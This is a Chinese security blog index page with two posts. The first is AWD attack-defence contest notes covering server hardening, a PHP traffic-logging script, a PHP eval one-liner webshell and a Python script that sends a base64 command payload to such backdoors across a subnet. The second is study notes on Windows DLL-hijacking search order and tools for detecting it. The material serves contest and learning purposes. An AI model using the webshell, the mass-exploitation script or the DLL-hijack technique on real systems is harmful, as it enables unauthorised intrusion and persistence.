<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
  
  
  
  
  <title>林中小屋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="林中小屋">
<meta property="og:url" content="http://antipassion.github.io/index.html">
<meta property="og:site_name" content="林中小屋">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Nayon|1163875625@qq.com">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="林中小屋" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.png">
  
  
  
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<meta name="generator" content="Hexo 5.4.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

        <a href="/" class="profilepic">
            
            <img lazy-src="/img/avatar.png" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/archives/">主页</a></li>
                        
                            <li><a  href="/archives/">所有文章</a></li>
                        
                            <li><a  href="/Nayon">author</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mailto"  target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/PE%E7%BB%93%E6%9E%84/" style="font-size: 20px;">PE结构</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://fk0x075.github.io/">117</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://alikon.art/">Nagarita</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://0range-x.github.io/">0r@nge</a>
                    
                    </div>
                </section>
                
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/avatar.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/Nayon">author</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mailto" target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
                    
                </div>
            </nav>
        </header>
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-awd知识梳理" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/" class="article-date">
      <time datetime="2021-10-22T09:02:01.000Z" itemprop="datePublished">2021-10-22</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/22/awd%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">awd知识梳理</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>由于一个月后需要参加一项awd比赛，为了防止过去之后什么也不懂的情况发生，写下这篇笔记用于记录整理awd比赛可能会用到的一些零零碎碎的知识点。</p>
<h2 id="0X01-目录索引"><a href="#0X01-目录索引" class="headerlink" title="0X01 目录索引"></a>0X01 目录索引</h2><ol>
<li>加固阶段</li>
<li>攻防阶段</li>
</ol>
<h3 id="1-加固阶段"><a href="#1-加固阶段" class="headerlink" title="1.加固阶段"></a>1.加固阶段</h3><ol>
<li><p>修改ssh登陆密码</p>
<p>首先根据主办方提供的ssh账号登陆到我们的服务器，并在第一时间下通过passwd修改密码，最好改为强密码，避免其他队伍通过弱口令或默认口令进入我们服务器。<img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022155257543.png" alt="image-20211022155257543"></p>
</li>
<li><p>备份mysql数据库、网站源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p 数据库名 &gt; 备份文件 <span class="comment">#进行数据库备份</span></span><br><span class="line">source C:\User\<span class="number">86156</span>\Desktop\web\test.sql <span class="comment">#进入数据库，将数据库备份文件导入</span></span><br><span class="line">tar -czvf 打包文件.tar.gz  打包目录 </span><br><span class="line">tar -zxvf 打包文件  <span class="comment">#解压打包文件</span></span><br><span class="line">利用python3 -m http.server <span class="number">8080</span>| python -m SimpleHTTPServer <span class="number">8080</span>|scp 命令将文件传输至本机进行审计</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li>
<li><p>进入web主目录审计源码，查找隐藏后门文件以及webshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al #列出目录内所有文件，避免.xxx.php 从而被隐藏后门文件。</span><br><span class="line">crontab -e #查看计划任务表</span><br><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></figure>

<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161419311.png" alt="image-20211022161419311"></p>
</li>
<li><p>利用find | xrags grep “xxx” 粗略查找网站中的隐藏后门，找到后对其进行删除操作</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /<span class="keyword">var</span>/www/html |xargs grep <span class="string">&quot;system&quot;</span> </span><br><span class="line"><span class="comment">#system、eval、assert、exec、passthru、shell_exec都要留心查一下</span></span><br><span class="line"><span class="comment">#include、require、include_once 、require_once等包含函数也可留意</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022161723171.png" alt="image-20211022161723171"></p>
<p>​            5.后门排查完毕后，对代码进行审计，重点查看upload以及sql，若主办方还提供D盾等排查后门工具，可一起利用d盾进行后门排查</p>
<p><img src="/images/awd%E8%B5%9B%E9%A1%B9%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9.assets/image-20211022163226399.png" alt="image-20211022163226399"></p>
<h3 id="2-攻防阶段"><a href="#2-攻防阶段" class="headerlink" title="2.攻防阶段"></a>2.攻防阶段</h3><p>1安排上流量监控脚本，筛选其他攻击队的可利用payload放入自己武器库之中</p>
<p>使用时需要将waf.php include包含进文件之中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="string">&#x27;./logs&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>)</span><br><span class="line"><span class="variable">$headers</span>[str_replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, ucwords(strtolower(str_replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, substr(<span class="variable">$name</span>, <span class="number">5</span>)))))] = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$headers</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>;</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>;</span><br><span class="line"><span class="variable">$header</span> = getallheaders();</span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]);</span><br><span class="line"><span class="variable">$input</span> = <span class="keyword">array</span>(<span class="string">&quot;Get&quot;</span>=&gt;<span class="variable">$get</span>, <span class="string">&quot;Post&quot;</span>=&gt;<span class="variable">$post</span>, <span class="string">&quot;Cookie&quot;</span>=&gt;<span class="variable">$cookie</span>, <span class="string">&quot;File&quot;</span>=&gt;<span class="variable">$files</span>, <span class="string">&quot;Header&quot;</span>=&gt;<span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line">logging(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y-m-d G:i:s&quot;</span>);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>, <span class="string">&quot;\r\n&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\r\n&quot;</span>.print_r(<span class="variable">$var</span>, <span class="literal">true</span>), FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);</span><br><span class="line">file_put_contents(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>同时可联用apache、nginx的日志文件，通过grep筛查拿到可利用payload</p>
<p>2.根据后门文件写批量拿flag脚本，人菜写的脚本烂，诸位师傅别骂哈</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="comment">###  目前需求如下：</span></span><br><span class="line"><span class="comment"># 1，第一遍拿到存活主机并尝试通过get方式拿到flag，并将flag存入文件内</span></span><br><span class="line"><span class="comment"># 2. 回显为空的，将存活Ip放入一个Post_url列表中，再在下方通过post_getflag方式走一遍流程，尝试拿flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用Get请求方式请求flag</span></span><br><span class="line"></span><br><span class="line">def get_flag(url,payload,flag,header):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;开始探测:&quot;</span>,url.format(i))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url.format(i),params=payload,timeout=<span class="number">2</span>,headers=header)</span><br><span class="line">            res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;状态码:&quot;</span>,res.status_code)</span><br><span class="line">            <span class="keyword">if</span> (flag in str(res.text)):</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;Get flag successful!&quot;</span>)</span><br><span class="line">                f = open(<span class="string">&quot;getflag.txt&quot;</span>, mode=<span class="string">&quot;a&quot;</span>)</span><br><span class="line">                f.write(res.text)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (res.status_code == <span class="number">200</span>):</span><br><span class="line">                    post_urls.append(url.format(i))</span><br><span class="line">                    <span class="comment"># f = open(&quot;Post_getflag.txt&quot;, mode=&quot;a&quot;)</span></span><br><span class="line">                    <span class="comment"># #利用\r\n将写入的数据换行</span></span><br><span class="line">                    <span class="comment"># f.write(url.format(i)+&quot;\r&quot;)</span></span><br><span class="line">                    <span class="comment"># f.close()</span></span><br><span class="line"></span><br><span class="line">        except requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            e</span><br><span class="line"></span><br><span class="line"><span class="comment">#POST抓取flag</span></span><br><span class="line">def post_Getflag(payload,flag):</span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    data[<span class="string">&#x27;pass&#x27;</span>]=<span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span></span><br><span class="line">    <span class="keyword">for</span> url in post_urls:</span><br><span class="line">        <span class="keyword">print</span>(url)</span><br><span class="line">        res = requests.post(url,data=data,timeout=<span class="number">2</span>)</span><br><span class="line">        res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="keyword">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@eval(base64_decode($_POST[pass]));    一句话木马</span></span><br><span class="line"><span class="comment">#system(&quot;more flag.txt&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#开始嗨皮</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">#此处偷了个懒，默认按照192.168.155.0/24段内的主机是awd内网靶机环境</span></span><br><span class="line">    url = <span class="string">&quot;http://192.168.155.&#123;0&#125;/pcap.php&quot;</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span><span class="string">&quot;c3lzdGVtKCJtb3JlIGZsYWcudHh0Iik7&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">    post_urls=[]</span><br><span class="line">    get_flag(url,payload,flag,header)</span><br><span class="line">    post_Getflag(payload,flag,header)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;完成！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在获取flag的时候，还可以通过写入不死马、计划任务上马等手段进行权限维持，避免后门被清理无法再下轮flag投放时获取不到。</p>
<p>简单来说，攻防阶段主要是快速编写批量爆破flag脚本并运行读取，另外根据日志或流控脚本发现其他未修复漏洞进行及时修复避免失分。</p>
<p>今天先更新到这里，以后如果还有其他内容还会陆续更新本文….</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-dll劫持学习" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/18/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0/" class="article-date">
      <time datetime="2021-10-18T00:28:13.000Z" itemprop="datePublished">2021-10-18</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/18/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0/">DLL劫持学习</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="什么是dll文件？"><a href="#什么是dll文件？" class="headerlink" title="什么是dll文件？"></a>什么是dll文件？</h3><p>DLL（Dynamic Link Library）被称为动态链接库文件，又被称之为“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p>
<p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去按照顺序搜索这些特定目录时下查找这个DLL,只要能够将恶意的DLL放在优先于正常DLL所在的目录，就能够欺骗系统优先加载恶意DLL，来实现”劫持”上线</p>
<h3 id="dll原理利用"><a href="#dll原理利用" class="headerlink" title="dll原理利用"></a>dll原理利用</h3><h4 id="Windows-xp-sp2之前"><a href="#Windows-xp-sp2之前" class="headerlink" title="Windows xp sp2之前"></a>Windows xp sp2之前</h4><p>windows查找DLL的目录以及对应顺序：</p>
<ol>
<li>进程对应的应用程序所在目录</li>
<li>当前目录</li>
<li>系统目录（Current Directory）</li>
<li>16位系统目录</li>
<li>Windows目录（通过GetWindowsDirectory 获取）</li>
<li>PATH环境变量中的各个目录</li>
</ol>
<p>例如：在一个PC上，doc文档打开会首先被应用程序office打开，而office运行的时候会加载系统的一个dll文件，系统的dll不是在应用程序的所在目录当中，而是会去系统目录中去查找，这是根据调用dll目录的优先级顺序可知，我们如果在当前目录，也就是doc文件所在目录放上一个恶意的dll来代替系统dll被加载进office程序中，则会执行dll中恶意代码从而被上线。</p>
<h4 id="Windows-xp-sp2之后"><a href="#Windows-xp-sp2之后" class="headerlink" title="Windows xp sp2之后"></a>Windows xp sp2之后</h4><p>Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode  默认会被开启）</p>
<p>默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1</p>
<ol>
<li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:\ProgramFiles\uTorrent）</li>
<li>系统目录（即%windir%system32）；</li>
<li>16位系统目录（即%windir%system）；</li>
<li>Windows目录（即%windir%）；</li>
<li>当前目录（运行的某个文件所在目录，比如C:\Documents and Settings\Administrator\Desktop\test）；</li>
<li>PATH环境变量中的各个目录；</li>
</ol>
<h4 id="Windows-7-以上版本"><a href="#Windows-7-以上版本" class="headerlink" title="Windows 7 以上版本"></a>Windows 7 以上版本</h4><p>系统取消了SafeDllSearchMode 而启用KnowDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置为：</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p>
<p>那么最终Windows2003以上以及win7以上操作系统，会结合“DLL路径搜索顺序”和KnownDLLs注册表项”的机制来确定应用程序将要调用的DLL路径，之后，应用程序会将DLL载入自己内存空间，通过导入导出表来调用执行相关功能。</p>
<ul>
<li>默认情况之下，若软件安装在c盘根目录，而不是c:\Program Files，哪经过身份验证的用户具有该目录的写权限，另外，perl,python,ruby等软件都添加到path变量中，攻击者可以调用python等程序在当前目录中编写Dll，只要重新运行程序就会中招</li>
<li>SafeDllSearchMode + KnownDLLs二者结合可以用来防范dll劫持，但如果调用未曾出现于knowDlls表上的dll，那么无论SafeDllSearchMode模式是否会被开启，应用程序调用dll默认搜索路径始终会先从程序的当前目录开始，这边就存在一个攻击手段，可利用反汇编软件，找出PE程序所调用的不常见dll（不在KnowDlls目录中的），利用Windows特性，即不在名单之内的dll优先在本层目录下调用，可写一份恶意dll在应用程序的同级目录下优先加载调用，实现getshell或维权</li>
</ul>
<h3 id="dll劫持检查"><a href="#dll劫持检查" class="headerlink" title="dll劫持检查"></a>dll劫持检查</h3><h4 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h4><p>利用Process Explorer 检查exe程序主要加载的dll文件，此处借助搜Tim应用来学习搜索可劫持dll。</p>
<p>此处可发现Resource.dll,未在系统目录下进行调用，推测此dll文件未在KnowDlls列表中。</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016095907746.png" alt="image-20211016095907746"></p>
<p>在KnowDlls中检查，确实发现不在其中</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016094442231.png" alt="image-20211016094442231"></p>
<p>由此可知，搜狗拼音启动时，可以从应用所在目录下优先调用dll文件，这就造成了dll文件劫持的风险。</p>
<h4 id="DLL-Hijack-Auditor-DLL劫持审计器"><a href="#DLL-Hijack-Auditor-DLL劫持审计器" class="headerlink" title="DLL Hijack Auditor(DLL劫持审计器)"></a>DLL Hijack Auditor(DLL劫持审计器)</h4><p>下载地址：<a target="_blank" rel="noopener" href="http://securityxploded.com/getsoftware_direct.php?id=7777">http://securityxploded.com/getsoftware_direct.php?id=7777</a></p>
<p>误报率较高</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016100521662.png" alt="image-20211016100521662"></p>
<h4 id="Rattler"><a href="#Rattler" class="headerlink" title="Rattler"></a>Rattler</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/sensepost/rattler/releases</span><br></pre></td></tr></table></figure>

<p>探测了好多，一个也没成功</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016102119448.png" alt="image-20211016102119448"></p>
